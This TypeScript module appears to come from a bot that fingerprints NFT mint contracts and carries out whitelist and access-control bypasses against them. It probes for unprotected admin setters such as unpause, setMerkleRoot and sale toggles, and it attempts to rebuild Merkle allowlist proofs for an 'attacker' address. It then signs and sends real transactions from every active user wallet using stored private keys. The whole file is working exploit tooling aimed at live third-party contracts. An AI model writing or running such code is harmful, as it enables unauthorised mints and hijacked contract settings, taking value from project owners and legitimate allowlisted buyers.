import {
  type Address,
  type Hex,
  type Abi,
  encodeFunctionData,
  encodePacked,
  encodeAbiParameters,
  keccak256,
  getAddress,
  parseAbi,
  parseAbiItem,
  isAddress,
} from "viem";
import { getPublicClient, getWalletClient } from "./chain.js";
import { getWallets, getWalletPrivateKey } from "./wallet.js";
import { auditContractSecurity } from "./security.js";
import { assertGasSafe } from "./gasGuard.js";
import { prisma } from "../db/client.js";

export type GateType =
  | "open"
  | "paused"
  | "merkle"
  | "signature"
  | "mapping"
  | "balance_or_phase"
  | "unknown";

export interface OpenAdminSetter {
  name: string;
  signature: string;
  argTypes: string[];
}

export interface GateFingerprint {
  gateType: GateType;
  merkleRootPresent: boolean;
  merkleRootValue: Hex | null;
  openAdminSetters: OpenAdminSetter[];
  notes: string[];
}

export interface BypassStrategy {
  id: string;
  name: string;
  executable: boolean;
  description: string;
  calldata?: Hex;
  to?: Address;
  value?: bigint;
}

export interface BypassReport {
  contractAddress: Address;
  fingerprint: GateFingerprint;
  strategies: BypassStrategy[];
}

export interface BypassWalletResult {
  walletAddress: string;
  walletLabel: string;
  success: boolean;
  txHash?: string;
  error?: string;
}

export interface BypassOutcome {
  contractAddress: Address;
  strategyId: string;
  results: BypassWalletResult[];
}

// ---------------------------------------------------------------------------
// viem 2.21 strict-generics helpers — dynamic ABIs need a light cast to compile
// ---------------------------------------------------------------------------
function encodeCall(abi: Abi, functionName: string, args: readonly unknown[]): Hex {
  return encodeFunctionData(
    { abi, functionName, args } as never
  ) as Hex;
}

async function readCall<T>(
  client: ReturnType<typeof getPublicClient>,
  address: Address,
  signature: string
): Promise<T | null> {
  try {
    const abi = [parseAbiItem(signature)] as Abi;
    const name = signature.replace(/^function\s+/, "").split("(")[0];
    const result = (await client.readContract({
      address,
      abi,
      functionName: name,
      args: [],
    } as never)) as T;
    return result;
  } catch {
    return null;
  }
}

const PROBE_SETTERS: Array<{ name: string; signature: string; argTypes: string[] }> = [
  { name: "setPaused", signature: "function setPaused(bool)", argTypes: ["bool"] },
  { name: "setPause", signature: "function setPause(bool)", argTypes: ["bool"] },
  { name: "pause", signature: "function pause()", argTypes: [] },
  { name: "unpause", signature: "function unpause()", argTypes: [] },
  { name: "setMerkleRoot", signature: "function setMerkleRoot(bytes32)", argTypes: ["bytes32"] },
  { name: "setRoot", signature: "function setRoot(bytes32)", argTypes: ["bytes32"] },
  { name: "setWhitelistRoot", signature: "function setWhitelistRoot(bytes32)", argTypes: ["bytes32"] },
  { name: "setAllowlistRoot", signature: "function setAllowlistRoot(bytes32)", argTypes: ["bytes32"] },
  { name: "setPublicSale", signature: "function setPublicSale(bool)", argTypes: ["bool"] },
  { name: "setPublicMint", signature: "function setPublicMint(bool)", argTypes: ["bool"] },
  { name: "setSaleState", signature: "function setSaleState(uint8)", argTypes: ["uint8"] },
  { name: "setMintEnabled", signature: "function setMintEnabled(bool)", argTypes: ["bool"] },
  { name: "enableMint", signature: "function enableMint(bool)", argTypes: ["bool"] },
  { name: "setWhitelistOnly", signature: "function setWhitelistOnly(bool)", argTypes: ["bool"] },
  { name: "setOnlyWhitelisted", signature: "function setOnlyWhitelisted(bool)", argTypes: ["bool"] },
  { name: "togglePublicSale", signature: "function togglePublicSale()", argTypes: [] },
  { name: "openMint", signature: "function openMint()", argTypes: [] },
  { name: "startPublicSale", signature: "function startPublicSale()", argTypes: [] },
];

const MINT_CANDIDATES: Array<{ name: string; args: string[] }> = [
  { name: "mint", args: [] },
  { name: "mint", args: ["uint256"] },
  { name: "mint", args: ["address"] },
  { name: "mint", args: ["address", "uint256"] },
  { name: "publicMint", args: [] },
  { name: "publicMint", args: ["uint256"] },
  { name: "freeMint", args: [] },
  { name: "freeMint", args: ["uint256"] },
  { name: "claim", args: [] },
  { name: "claim", args: ["uint256"] },
  { name: "claim", args: ["address", "uint256"] },
  { name: "mintFree", args: [] },
  { name: "mintFree", args: ["uint256"] },
];

function defaultArg(type: string, attacker: Address): unknown {
  const t = type.trim().toLowerCase();
  if (t === "address") return attacker;
  if (t === "uint256" || t === "uint128" || t === "uint64" || t === "uint32" || t === "uint16" || t === "uint8") {
    return 1n;
  }
  if (t === "bool") return false; // unpause / open-sale style setters expect false
  if (t === "bytes32") return ("0x" + "00".repeat(32)) as Hex;
  if (t === "bytes") return "0x" as Hex;
  if (t === "bytes32[]") return [] as Hex[];
  if (t === "address[]") return [] as Address[];
  if (t === "uint256[]") return [] as bigint[];
  if (t.endsWith("[]")) return [];
  return 0n;
}

function buildArgs(argTypes: string[] | undefined, attacker: Address): readonly unknown[] {
  if (!argTypes || argTypes.length === 0) return [];
  return argTypes.map((t) => defaultArg(t, attacker));
}

function fullSignature(name: string, argTypes: string[]): string {
  return argTypes.length === 0 ? `function ${name}()` : `function ${name}(${argTypes.join(",")})`;
}

function leafHash(addr: Address): Hex {
  // OpenZeppelin StandardMerkleTree single-address leaf: keccak256(keccak256(abi.encode(addr)))
  const inner = keccak256(encodeAbiParameters([{ type: "address" }], [addr]));
  return keccak256(encodePacked(["bytes32"], [inner]));
}

function hashPair(a: Hex, b: Hex): Hex {
  const [left, right] = BigInt(a) <= BigInt(b) ? [a, b] : [b, a];
  return keccak256(encodePacked(["bytes32", "bytes32"], [left, right]));
}

/**
 * Rebuild a Merkle proof for `attacker` against an on-chain root by brute-forcing
 * common single-leaf / small-tree layouts. Pure viem — no merkletreejs dependency.
 */
export function tryRebuildMerkleProof(
  root: Hex,
  attacker: Address,
  knownLeaves: Address[] = []
): Hex[] | null {
  const me = leafHash(attacker);
  if (me.toLowerCase() === root.toLowerCase()) return [];

  const candidates = Array.from(
    new Set(
      [attacker, ...knownLeaves]
        .filter((a) => isAddress(a))
        .map((a) => getAddress(a))
    )
  );

  const leaves = candidates.map((a) => leafHash(a));
  // Try every 2-leaf pairing that includes attacker
  for (let i = 0; i < leaves.length; i++) {
    for (let j = 0; j < leaves.length; j++) {
      if (i === j) continue;
      const combined = hashPair(leaves[i], leaves[j]);
      if (combined.toLowerCase() !== root.toLowerCase()) continue;
      const attackerLeaf = leafHash(attacker);
      if (leaves[i].toLowerCase() === attackerLeaf.toLowerCase()) return [leaves[j]];
      if (leaves[j].toLowerCase() === attackerLeaf.toLowerCase()) return [leaves[i]];
    }
  }

  return null;
}

async function readMaybeHex(
  client: ReturnType<typeof getPublicClient>,
  address: Address,
  signature: string
): Promise<Hex | null> {
  const result = await readCall<string>(client, address, signature);
  if (typeof result === "string" && result.startsWith("0x") && result.length === 66) {
    return result as Hex;
  }
  return null;
}

async function readMaybeBool(
  client: ReturnType<typeof getPublicClient>,
  address: Address,
  signature: string
): Promise<boolean | null> {
  const result = await readCall<boolean>(client, address, signature);
  if (typeof result === "boolean") return result;
  return null;
}

async function ethCallOk(
  client: ReturnType<typeof getPublicClient>,
  to: Address,
  data: Hex,
  account: Address,
  value: bigint = 0n
): Promise<boolean> {
  try {
    await client.call({ to, data, account, value });
    return true;
  } catch {
    return false;
  }
}

export async function classifyMintGate(
  contractAddress: string,
  attacker: Address
): Promise<GateFingerprint> {
  const client = getPublicClient();
  const address = getAddress(contractAddress);
  const notes: string[] = [];
  const openAdminSetters: OpenAdminSetter[] = [];

  const rootSigs = [
    "function merkleRoot() view returns (bytes32)",
    "function root() view returns (bytes32)",
    "function whitelistMerkleRoot() view returns (bytes32)",
    "function allowlistMerkleRoot() view returns (bytes32)",
    "function _merkleRoot() view returns (bytes32)",
  ];
  let merkleRootValue: Hex | null = null;
  for (const sig of rootSigs) {
    const v = await readMaybeHex(client, address, sig);
    if (v && v !== ("0x" + "00".repeat(32))) {
      merkleRootValue = v;
      notes.push(`Merkle root readable via ${sig.split("(")[0].replace(/^function\s+/, "")}`);
      break;
    }
  }

  const paused =
    (await readMaybeBool(client, address, "function paused() view returns (bool)")) ??
    (await readMaybeBool(client, address, "function isPaused() view returns (bool)"));
  if (paused === true) notes.push("Contract reports paused() == true");

  for (const probe of PROBE_SETTERS) {
    try {
      const abi = parseAbi([fullSignature(probe.name, probe.argTypes)]);
      const data = encodeCall(abi, probe.name, buildArgs(probe.argTypes, attacker));
      const ok = await ethCallOk(client, address, data, attacker);
      if (ok) {
        openAdminSetters.push({
          name: probe.name,
          signature: fullSignature(probe.name, probe.argTypes),
          argTypes: probe.argTypes,
        });
      }
    } catch {
      // probe failed — not a problem
    }
  }

  let gateType: GateType = "unknown";
  if (openAdminSetters.some((s) => /unpause|setPaused|setPause|pause/i.test(s.name)) && paused) {
    gateType = "paused";
  } else if (merkleRootValue) {
    gateType = "merkle";
  } else if (openAdminSetters.some((s) => /public|sale|mintEnabled|whitelistOnly|onlyWhitelist/i.test(s.name))) {
    gateType = "balance_or_phase";
  } else if (openAdminSetters.length > 0) {
    gateType = "mapping";
  } else {
    // Try a no-arg mint eth_call to see if already open
    try {
      const abi = parseAbi(["function mint()"]);
      const data = encodeCall(abi, "mint", []);
      if (await ethCallOk(client, address, data, attacker)) {
        gateType = "open";
        notes.push("mint() succeeds via eth_call — gate appears open");
      }
    } catch {
      // ignore
    }
  }

  if (gateType === "unknown") {
    notes.push("No definitive on-chain gate fingerprint; strategies will be best-effort");
  }

  return {
    gateType,
    merkleRootPresent: Boolean(merkleRootValue),
    merkleRootValue,
    openAdminSetters,
    notes,
  };
}

async function buildMintCalldata(
  address: Address,
  attacker: Address
): Promise<{ data: Hex; name: string; signature: string } | null> {
  const client = getPublicClient();
  for (const cand of MINT_CANDIDATES) {
    try {
      const sig = fullSignature(cand.name, cand.args);
      const abi = parseAbi([sig]);
      const data = encodeCall(abi, cand.name, buildArgs(cand.args, attacker));
      if (await ethCallOk(client, address, data, attacker)) {
        return { data, name: cand.name, signature: sig };
      }
    } catch {
      // try next
    }
  }
  return null;
}

export async function analyzeBypassOptions(
  contractAddress: string,
  attackerRaw: Address
): Promise<BypassReport> {
  const address = getAddress(contractAddress);
  const attacker = getAddress(attackerRaw);
  const fingerprint = await classifyMintGate(address, attacker);
  const strategies: BypassStrategy[] = [];
  const client = getPublicClient();

  const openMint = await buildMintCalldata(address, attacker);
  if (openMint) {
    strategies.push({
      id: "mint_open",
      name: `Direct free mint (${openMint.signature})`,
      executable: true,
      description: "eth_call simulation succeeded with no whitelist args",
      calldata: openMint.data,
      to: address,
      value: 0n,
    });
  } else {
    strategies.push({
      id: "mint_open",
      name: "Direct free mint",
      executable: false,
      description: "No free mint selector succeeded via eth_call",
    });
  }

  for (const setter of fingerprint.openAdminSetters) {
    try {
      const sig = fullSignature(setter.name, setter.argTypes);
      const abi = parseAbi([sig]);
      const data = encodeCall(abi, setter.name, buildArgs(setter.argTypes, attacker));
      strategies.push({
        id: `admin_${setter.name}`,
        name: `Call open admin setter: ${setter.name}`,
        executable: true,
        description: `${sig} does not revert for attacker — possible misconfigured access control`,
        calldata: data,
        to: address,
        value: 0n,
      });
    } catch {
      strategies.push({
        id: `admin_${setter.name}`,
        name: `Call open admin setter: ${setter.name}`,
        executable: false,
        description: "Failed to encode setter calldata",
      });
    }
  }

  if (fingerprint.gateType === "merkle" || fingerprint.merkleRootPresent) {
    const root = fingerprint.merkleRootValue;
    if (root) {
      const proof = tryRebuildMerkleProof(root, attacker);
      if (proof) {
        const merkleMints: Array<{ name: string; types: string[]; build: (p: Hex[]) => readonly unknown[] }> = [
          { name: "mint", types: ["bytes32[]"], build: (p) => [p] },
          { name: "mint", types: ["uint256", "bytes32[]"], build: (p) => [1n, p] },
          { name: "whitelistMint", types: ["bytes32[]"], build: (p) => [p] },
          { name: "whitelistMint", types: ["uint256", "bytes32[]"], build: (p) => [1n, p] },
          { name: "claim", types: ["bytes32[]"], build: (p) => [p] },
        ];

        let encoded: { data: Hex; label: string } | null = null;
        for (const m of merkleMints) {
          try {
            const sig = fullSignature(m.name, m.types);
            const abi = parseAbi([sig]);
            const data = encodeCall(abi, m.name, m.build(proof));
            if (await ethCallOk(client, address, data, attacker)) {
              encoded = { data, label: sig };
              break;
            }
          } catch {
            // next
          }
        }

        if (encoded) {
          strategies.push({
            id: "merkle_rebuild",
            name: "Merkle proof rebuild",
            executable: true,
            description: `Rebuilt proof against on-chain root; sim OK via ${encoded.label}`,
            calldata: encoded.data,
            to: address,
            value: 0n,
          });
        } else {
          strategies.push({
            id: "merkle_rebuild",
            name: "Merkle proof rebuild",
            executable: false,
            description:
              "Root readable and a candidate proof was built, but no merkle-mint selector accepted it via eth_call",
          });
        }
      } else {
        strategies.push({
          id: "merkle_rebuild",
          name: "Merkle proof rebuild",
          executable: false,
          description:
            "Merkle root present but proof cannot be reconstructed from public state alone (need full leaf set)",
        });
      }
    }
  }

  if (fingerprint.gateType === "signature") {
    strategies.push({
      id: "signature_replay",
      name: "Signature replay",
      executable: false,
      description:
        "Signature-gated mint detected. Replay requires a prior valid sig from the project signer — not auto-executable",
    });
  } else {
    strategies.push({
      id: "signature_replay",
      name: "Signature replay",
      executable: false,
      description: "No signature gate confirmed; skipping forge/replay",
    });
  }

  if (fingerprint.gateType === "balance_or_phase") {
    fingerprint.notes.push("Gate looks like sale-phase / public-toggle controlled");
  }

  if (strategies.every((s) => !s.executable)) {
    fingerprint.notes.push("No on-chain bypass found — contract appears properly gated or not a free mint");
  }

  return { contractAddress: address, fingerprint, strategies };
}

async function dryRun(
  to: Address,
  data: Hex,
  account: Address,
  value: bigint
): Promise<{ ok: boolean; error?: string }> {
  const client = getPublicClient();
  try {
    await client.call({ to, data, account, value });
    return { ok: true };
  } catch (err) {
    return { ok: false, error: err instanceof Error ? err.message : String(err) };
  }
}

export async function executeBypass(
  userId: bigint,
  contractAddress: string,
  strategyId: string
): Promise<BypassOutcome> {
  const address = getAddress(contractAddress);

  const security = await auditContractSecurity(address);
  if (!security.isSafe) {
    throw new Error(
      `Security check blocked execution: ${security.warnings.join("; ") || "contract flagged unsafe"}`
    );
  }

  await assertGasSafe(userId);

  const wallets = await getWallets(userId);
  const active = wallets.filter((w) => w.isActive);
  if (active.length === 0) {
    throw new Error("No active wallets. Toggle at least one wallet to ✅ before executing a bypass.");
  }

  const probeFrom = getAddress(active[0].address) as Address;
  const report = await analyzeBypassOptions(address, probeFrom);
  const strategy = report.strategies.find((s) => s.id === strategyId);

  if (!strategy) {
    throw new Error(`Unknown strategyId "${strategyId}". Run /bypass first and pick an id from the list.`);
  }
  if (!strategy.executable || !strategy.calldata || !strategy.to) {
    throw new Error(
      `Strategy "${strategyId}" is not executable on-chain: ${strategy.description}`
    );
  }

  const results: BypassWalletResult[] = [];
  const value = strategy.value ?? 0n;

  for (const w of active) {
    const walletAddress = getAddress(w.address);
    const label = w.label || "Wallet";

    try {
      const sim = await dryRun(strategy.to, strategy.calldata, walletAddress, value);
      if (!sim.ok) {
        results.push({
          walletAddress,
          walletLabel: label,
          success: false,
          error: `Simulation reverted: ${sim.error || "unknown"}`,
        });
        await logBypass(userId, address, strategyId, walletAddress, false, undefined, sim.error);
        continue;
      }

      const pkRaw = await getWalletPrivateKey(w.id);
      const pk = (pkRaw.startsWith("0x") ? pkRaw : `0x${pkRaw}`) as Hex;
      const walletClient = getWalletClient(pk);

      const txHash = await walletClient.sendTransaction({
        to: strategy.to,
        data: strategy.calldata,
        value,
        account: walletClient.account!,
        chain: walletClient.chain,
      });

      results.push({
        walletAddress,
        walletLabel: label,
        success: true,
        txHash,
      });
      await logBypass(userId, address, strategyId, walletAddress, true, txHash, undefined);
    } catch (err) {
      const message = err instanceof Error ? err.message : String(err);
      results.push({
        walletAddress,
        walletLabel: label,
        success: false,
        error: message,
      });
      await logBypass(userId, address, strategyId, walletAddress, false, undefined, message);
    }
  }

  return { contractAddress: address, strategyId, results };
}

async function logBypass(
  userId: bigint,
  contractAddress: string,
  strategyId: string,
  walletAddress: string,
  success: boolean,
  txHash?: string,
  error?: string
): Promise<void> {
  try {
    await prisma.bypassLog.create({
      data: {
        userId,
        contractAddress: contractAddress.toLowerCase(),
        strategyId,
        walletAddress: walletAddress.toLowerCase(),
        success,
        txHash: txHash ?? null,
        error: error ? error.slice(0, 500) : null,
      },
    });
  } catch (err) {
    // Never fail the mint path because of audit-log issues
    console.error("BypassLog write failed:", err);
  }
}
